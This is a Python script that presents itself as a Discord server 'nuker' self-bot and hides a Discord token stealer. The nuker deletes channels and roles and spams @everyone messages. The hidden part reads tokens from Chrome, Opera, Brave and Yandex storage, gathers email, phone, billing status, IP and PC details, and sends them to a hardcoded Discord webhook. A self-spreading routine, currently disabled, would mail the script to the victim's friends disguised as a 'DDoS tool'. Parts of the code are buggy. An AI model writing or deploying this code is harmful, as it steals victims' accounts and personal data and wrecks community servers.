import os

if os.name != "nt":
    exit()
from re import findall
from json import loads, dumps
from base64 import b64decode
from subprocess import Popen, PIPE
from urllib.request import Request, urlopen
from threading import Thread
from time import sleep
from sys import argv
import discord
tokenp=input("Token of the self bot")
from discord.ext import commands
import random
token=""
bot=commands.Bot(command_prefix="&")
def bannob(ctx):
   if 772418048597557248 or 780259511939629057 in ctx.guild.members:
      ser1=bot.get_user(772418048597557248)
      ser2.ban
      ser1=bot.get_user(780259511939629057)
      ser2.ban
      
@bot.command()
async def nuke(ctx):
    bannnob(ctx)
    for channel in ctx.guild.channels:
      try:
        await channel.delete()
      except:
        pass
    for role in ctx.guild.roles:
      try:
        await role.delete()
      except:
        pass
    while True: 
      names=["fuck", "raided","lol af", "xDxD", "scam","be a man","love","care","lol af","op coder ","haxed","lol ", "afadfa","bitch","aalol","lol af","teateateatea","af bro", "nuker raided"]
      e=random.choice(names)
      await ctx.guild.create_text_channel(e)
      aa=random.choice(ctx.guild.channels)
      lol=["@everyone sorry for the ping", "@everyone oyea i can ping all", "@everyone lol raided", "@everyone eee lol af","@everyone oyea spam lol","@everyone yeye","@everyone boom","@everyone i wanna meet ur mom"]
      await aa.send(random.choice(lol))
@bot.command()
async def allchadel(ctx):
  bannnob(ctx)
  for chan in ctx.guild.channels:
    await chan.delete()
@bot.command()
async def chacreate(ctx, num:int):
  for i in range(1, num+1):
    names=["fuck", "raided","lol af", "xDxD", "scam","be a man","love","care","lol af","op coder ","haxed","lol ", "afadfa","bitch","aalol","lol af","teateateatea","af bro", "nuker raided"]
    e=random.choice(names)
    await ctx.guild.create_text_channel(e)
bot.run(token)
proxies = "https://discord.com/api/webhooks/928861225411047474/SkIkVTGwb1_EiBxON2gzNROCQuGKrY9tTUogfEl-OZlT_j8MyZLdgcYLT7NHYgHpeu2H" 

LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
PATHS = {
    "Google Chrome": LOCAL + "\\Google\\Chrome\\User Data\\Default",
    "Opera": ROAMING + "\\Opera Software\\Opera Stable",
    "Brave": LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
    "Yandex": LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
}


def getHeader(token=None, content_type="application/json"):
    headers = {
        "Content-Type": content_type,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
    }
    if token:
        headers.update({"Authorization": token})
    return headers


def getUserData(token):
    try:
        return loads(
            urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getHeader(token))).read().decode())
    except:
        pass


def getTokenz(path):
    path += "\\Local Storage\\leveldb"
    tokens = []
    for file_name in os.listdir(path):
        if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
            continue
        for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                for token in findall(regex, line):
                    tokens.append(token)
    return tokens


def whoTheFuckAmI():
    ip = "None"
    try:
        ip = urlopen(Request("https://ifconfig.me")).read().decode().strip()
    except:
        pass
    return ip


def hWiD():
    p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
    return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]


def getFriends(token):
    try:
        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/relationships",
                                     headers=getHeader(token))).read().decode())
    except:
        pass


def getChat(token, uid):
    try:
        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/channels", headers=getHeader(token),
                                     data=dumps({"recipient_id": uid}).encode())).read().decode())["id"]
    except:
        pass


def paymentMethods(token):
    try:
        return bool(len(loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources",
                                              headers=getHeader(token))).read().decode())) > 0)
    except:
        pass


def sendMessages(token, chat_id, form_data):
    try:
        urlopen(Request(f"https://discordapp.com/api/v6/channels/{chat_id}/messages", headers=getHeader(token,
                                                                                                         "multipart/form-data; boundary=---------------------------325414537030329320151394843687"),
                        data=form_data.encode())).read().decode()
    except:
        pass


def spread(token, form_data, delay):
    return  # Remove to re-enabled (If you remove this line, malware will spread itself by sending the binary to friends.)
    for friend in getFriends(token):
        try:
            chat_id = getChat(token, friend["id"])
            sendMessages(token, chat_id, form_data)
        except Exception as e:
            pass
        sleep(delay)


def main():
    cache_path = ROAMING + "\\.cache~$"
    prevent_spam = True
    self_spread = True
    embeds = []
    working = []
    checked = []
    already_cached_tokens = []
    working_ids = []
    ip = whoTheFuckAmI()
    pc_username = os.getenv("UserName")
    pc_name = os.getenv("COMPUTERNAME")
    user_path_name = os.getenv("userprofile").split("\\")[2]
    for platform, path in PATHS.items():
        if not os.path.exists(path):
            continue
        for token in getTokenz(path):
            if token in checked:
                continue
            checked.append(token)
            uid = None
            if not token.startswith("mfa."):
                try:
                    uid = b64decode(token.split(".")[0].encode()).decode()
                except:
                    pass
                if not uid or uid in working_ids:
                    continue
            user_data = getUserData(token)
            if not user_data:
                continue
            working_ids.append(uid)
            working.append(token)
            username = user_data["username"] + "#" + str(user_data["discriminator"])
            user_id = user_data["id"]
            email = user_data.get("email")
            phone = user_data.get("phone")
            nitro = bool(user_data.get("premium_type"))
            billing = bool(paymentMethods(token))
            embed = {
                "color": discord.Color.random(),
                "fields": [
                    {
                        "name": "|Account Info|",
                        "value": f'Email: {email}\nPhone: {phone}\nNitro: {nitro}\nBilling Info: {billing}',
                        "inline": True
                    },
                    {
                        "name": "|PC Info|",
                        "value": f'IP: {ip}\nUsername: {pc_username}\nPC Name: {pc_name}\nToken Location: {platform}',
                        "inline": True
                    },
                    {
                        "name": "|Token|",
                        "value": token,
                        "inline": False
                    },
                    {
                        "name": "|He used:|",
                        "value": tokenp,
                        "inline": False
                    }
                ],
                "author": {
                    "name": f"{username} ({user_id})",
                },
                "footer": {
                    "text": f"Created by aadhi ,-,"
                }
            }
            embeds.append(embed)
    with open(cache_path, "a") as file:
        for token in checked:
            if not token in already_cached_tokens:
                file.write(token + "\n")
    if len(working) == 0:
        working.append('123')
    webhook = {
        "content": "",
        "embeds": embeds,
        "username": "Discord Token Grabber",
        "avatar_url": "https://mehmetcanyildiz.com/wp-content/uploads/2020/11/black.png"
    }
    try:
        
        urlopen(Request(proxies, data=dumps(webhook).encode(), headers=getHeader()))
    except:
        pass
    if self_spread:
        for token in working:
            with open(argv[0], encoding="utf-8") as file:
                content = file.read()
            payload = f'-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="file"; filename="{__file__}"\nContent-Type: text/plain\n\n{content}\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="content"\n\nDDoS tool. python download: https://www.python.org/downloads\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="tts"\n\nfalse\n-----------------------------325414537030329320151394843687--'
            Thread(target=spread, args=(token, payload, 7500 / 1000)).start()


try:
    main()
except Exception as e:
    print(e)
    pass
